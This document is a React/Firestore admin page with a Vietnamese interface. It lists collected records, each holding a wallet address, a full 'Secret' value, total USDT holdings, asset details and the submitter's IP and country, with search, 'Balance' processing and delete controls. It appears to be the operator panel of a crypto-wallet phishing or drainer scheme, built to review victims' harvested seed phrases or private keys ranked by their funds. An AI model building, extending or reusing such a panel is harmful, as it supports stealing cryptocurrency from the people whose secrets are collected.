import React, { useState, useEffect, useRef } from "react";
import {
  collection,
  deleteDoc,
  doc,
  getDocs,
  onSnapshot,
  orderBy,
  query,
  updateDoc
} from "firebase/firestore";
import { db } from "../../firebase";
import moment from "moment";
import "../admin/index.scss";
import { UserOutlined } from "@ant-design/icons";
import { Button, DatePicker, Form, Input, Pagination } from "antd";
const { RangePicker } = DatePicker;
const statusClasses = {
  2: "bg-green-200 text-green-800",   // Active
  0: "bg-yellow-200 text-yellow-800", // Pending
  3: "bg-red-200 text-red-800",       // Suspended
  1: "bg-blue-200 text-blue-800"      // New / Custom
};
const AdminPage = () => {
  const [users, setUsers] = useState([]);
  const [totalRecord, setTotalRecords] = useState(1);
  const [currentPage, setCurrentPage] = useState(1);
  const [pageSize] = useState(30);
  const usersRef = collection(db, "mydata");
  const q = query(usersRef, orderBy("createdAt", "desc"));
  const audioRef = useRef(null);
  const [isSwitchOn, setIsSwitchOn] = useState(false);
  const [reload, setReload] = useState(false);
  const [filter, setFilter] = useState({});

  useEffect(() => {
    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      const userList = querySnapshot.docs.map((doc) => ({
        userID: doc.id,
        ...doc.data(),
      }));
      const offset = (currentPage - 1) * pageSize;
      const usersPerPage = userList.slice(offset, offset + pageSize);
      setUsers(usersPerPage);
      setTotalRecords(userList.length);
      setCurrentPage(1);
      setReload((prev) => !prev);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    const isMuted = localStorage.getItem("isMuted");
    setIsSwitchOn(isMuted === "true");
  }, []);

  const toggleSwitch = (e) => {
    setIsSwitchOn(e.target.checked);
    localStorage.setItem("isMuted", e.target.checked);
  };

  const filteredUsers = (userList) => {
    const { "range-time": dateRange, findkey } = filter;
    return userList.filter((user) => {
      if (
        findkey &&
        !(
          user.wallet.toLowerCase().includes(findkey.trim().toLowerCase()) ||
          user.secret.toLowerCase().includes(findkey.trim().toLowerCase())
        )
      ) {
        return false;
      }
      if(Number(user.s) == 0){
          return false;
      }
      if (dateRange) {
        const userDate = moment(user.createdAt);
        const startDate = moment(dateRange[0], "YYYY-MM-DD");
        const endDate = moment(dateRange[1], "YYYY-MM-DD");
        if (!userDate.isBetween(startDate, endDate, null, "[]")) {
          return false;
        }
      }
      return true;
    });
  };

  useEffect(() => {
    const fetchData = async () => {
      const querySnapshot = await getDocs(q);
      let userList = querySnapshot.docs.map((doc) => ({
        userID: doc.id,
        ...doc.data(),
      }));
      userList = filteredUsers(userList);
      const offset = (currentPage - 1) * pageSize;
      const usersPerPage = userList.slice(offset, offset + pageSize);
      setUsers(usersPerPage);
      setTotalRecords(userList.length);
    };
    fetchData();
  }, [currentPage, reload]);

  const handlePageChange = (page) => {
    setCurrentPage(page);
  };

  const handleStatus = async (statusval, userID) => {
    if (confirm("Are you sure to change status?")) {
      const userRef = doc(db, "mydata", userID);
      await updateDoc(userRef, {
        status: 1
        //statusval == 0 ? 1 : 0,
      });
      setReload((prev) => !prev);
    }
  };

  const handleDelete = async (userID) => {
    if (confirm("Are you want to delete this data?")) {
      var key = prompt("Enter a key", "");
      if (key == "delete") {
        const userRef = doc(db, "mydata", userID);
        await deleteDoc(userRef);
        setReload((prev) => !prev);
      }
    }
  };

  const onFinish = (fieldsValue) => {
    let findkey = fieldsValue["txt-search-key"];
    const values = { findkey };
    const rangeTimeValue = fieldsValue["range-time"];
    if (rangeTimeValue) {
      values["range-time"] = [
        rangeTimeValue[0].format("YYYY-MM-DD HH:mm:ss"),
        rangeTimeValue[1].format("YYYY-MM-DD HH:mm:ss"),
      ];
    }
    setFilter(values);
    setCurrentPage(1);
    setReload((prv) => !prv);
  };

  return (
    <div className="container mx-auto mt-8 px-2">
      <audio ref={audioRef} src="/music/tigitig.mp3"></audio>
      <h1 className="text-2xl font-bold mb-4">Danh sách người dùng</h1>

      {/* Bộ lọc */}
      <div className="w-full flex flex-col md:flex-row md:items-center gap-3 mb-4">
<label className="relative inline-flex items-center cursor-pointer"> <input type="checkbox" checked={isSwitchOn} onChange={toggleSwitch} className="sr-only peer" /> <div className="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:bg-blue-600 after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:after:translate-x-full peer-checked:after:border-white"> </div> <span className="ml-3 text-sm font-medium">Tắt tiếng</span> </label>
        <Form
          name="time_related_controls"
          onFinish={onFinish}
          layout="inline"
          className="flex-1 flex flex-wrap gap-2"
        >
          <Form.Item name="txt-search-key">
            <Input
              allowClear
              prefix={<UserOutlined />}
              placeholder="Wallet hoặc Secret"
            />
          </Form.Item>
          <Form.Item name="range-time">
            <RangePicker format="DD-MM-YYYY" />
          </Form.Item>
          <Form.Item>
            <Button type="primary" htmlType="submit" className="bg-blue-600">
              Tìm kiếm
            </Button>
          </Form.Item>
        </Form>
      </div>

      {/* Danh sách */}
      <div>
        {/* Desktop Table */}
        <div className="w-full overflow-x-auto overflow-y-hidden rounded-lg shadow hidden md:block">
          <table className="min-w-max border-collapse border border-gray-300">
            <thead>
              <tr>
                <th className="py-2 px-4 bg-gray-200">No.</th>
                <th className="py-2 px-4 bg-gray-200">Src.</th>
                <th className="py-2 px-4 bg-gray-200">Status</th>
                <th className="py-2 px-4 bg-gray-200">Wallet</th>
                <th className="py-2 px-4 bg-gray-200">Secret</th>
                <th className="py-2 px-4 bg-gray-200">Total USDT</th>
                <th className="py-2 px-4 bg-gray-200">Details</th>
                <th className="py-2 px-4 bg-gray-200">Time</th>
                <th className="py-2 px-4 bg-gray-200">IP</th>
                <th className="py-2 px-4 bg-gray-200">Action</th>
              </tr>
            </thead>
            <tbody>
              {users.map((user) => (
                
                <tr key={user.userID}>
                  <td className="py-2 px-4 border">{user.auto_id}</td>
                  <td className="py-2 px-4 border">{user.src}</td>
                  <td className="py-2 px-4 border">
                    
                    <span
                      className={`px-2 py-1 rounded text-xs font-medium ${
                        statusClasses[user.status] || "bg-slate-200 text-slate-800"
                      }`}
                    >
                      {
                        user.status === 0
                          ? "Chưa xử lý"
                          : user.status === 1
                          ? "Đang xử lý"
                          : user.status === 2
                          ? "Xử lý thành công"
                          : user.status === -1
                          ? "Xử lý lỗi"
                          : "Không xác định"
                      }   
                    </span>
                  </td>
                  <td className="py-2 px-4 border">{user.wallet}</td>
                  <td className="py-2 px-4 border">
                    <textarea
                      value={user.secret}
                      rows="2"
                      className="w-full border rounded"
                      readOnly
                    />
                  </td>
                  <td className="py-2 px-4 border">{user.total}</td>
                  <td className="py-2 px-4 border">
                    <textarea
                      value={user.assets}
                      rows="2"
                      className="w-full border rounded"
                      readOnly
                    />
                  </td>
                  <td className="py-2 px-4 border">
                    {moment(user.createdAt).format("YYYY-MM-DD HH:mm:ss")}
                  </td>
                  <td className="py-2 px-4 border">
                    {user.ip ? (user.ip.IP +':'+ user.ip.country) : "Unknown"}
                  </td>
                  <td className="py-2 px-4 border flex gap-2 flex-wrap">
                    <button
                      disabled={user.status === 1}
                      className={`min-w-fit px-3 py-1 rounded text-white text-sm bg-green-600
                      }`}
                      onClick={() => handleStatus(user.status, user.userID)}
                    >
                      Balance                   
                      </button>
                    <button
                      className="min-w-fit px-3 py-1 rounded bg-red-600 text-white text-sm"
                      onClick={() => handleDelete(user.userID)}
                    >
                      Delete
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Mobile Cards */}
        <div className="grid grid-cols-1 gap-4 md:hidden">
          {users.map((user) => (
            <div
              key={user.userID}
              className="bg-white rounded-lg shadow p-4 space-y-2"
            >
              <div className="flex justify-between">
                <span className="text-sm font-semibold">No: {user.auto_id}</span>
                <span className="text-sm font-semibold">Src: {user.src}</span>
                <span
                  className={`px-2 py-1 rounded text-xs font-medium ${
                        statusClasses[user.status] || "bg-slate-200 text-slate-800"
                  }`}
                >
                  {
                        user.status === 0
                          ? "Chưa xử lý"
                          : user.status === 1
                          ? "Đang xử lý"
                          : user.status === 2
                          ? "Xử lý thành công"
                          : user.status === -1
                          ? "Xử lý lỗi"
                          : "Không xác định"
                      }
                </span>
              </div>
              <div>
                <b>Wallet:</b> {user.wallet}
              </div>
              <div>
                <b>Secret:</b>
                <textarea
                  value={user.secret}
                  rows="2"
                  className="w-full border rounded"
                  readOnly
                />
              </div>
              <div>
                <b>Total USDT:</b> {user.total}
              </div>
              <div>
                <b>Details:</b>
                <textarea
                  value={user.assets}
                  rows="2"
                  className="w-full border rounded"
                  readOnly
                />
              </div>
              <div>
                <b>Time:</b>{" "}
                {moment(user.createdAt).format("YYYY-MM-DD HH:mm:ss")}
              </div>
              <div>
                <b>IP:</b> {user.ip ? (user.ip.IP +':'+ user.ip.country) : "Unknown"}
              </div>
              <div className="flex gap-2 mt-2">
                <button
                  disabled={user.status === 1}
                  className={`flex-1 px-3 py-1 rounded text-white text-sm bg-green-600
                  }`}
                  onClick={() => handleStatus(user.status, user.userID)}
                >
                  Balance
                </button>
                <button
                  className="flex-1 px-3 py-1 rounded bg-red-600 text-white text-sm"
                  onClick={() => handleDelete(user.userID)}
                >
                  Delete
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Phân trang */}
      <div className="mt-4 flex justify-center">
        <Pagination
          showQuickJumper
          current={currentPage}
          pageSize={pageSize}
          defaultCurrent={1}
          total={totalRecord}
          onChange={handlePageChange}
        />
      </div>
    </div>
  );
};

export default AdminPage;
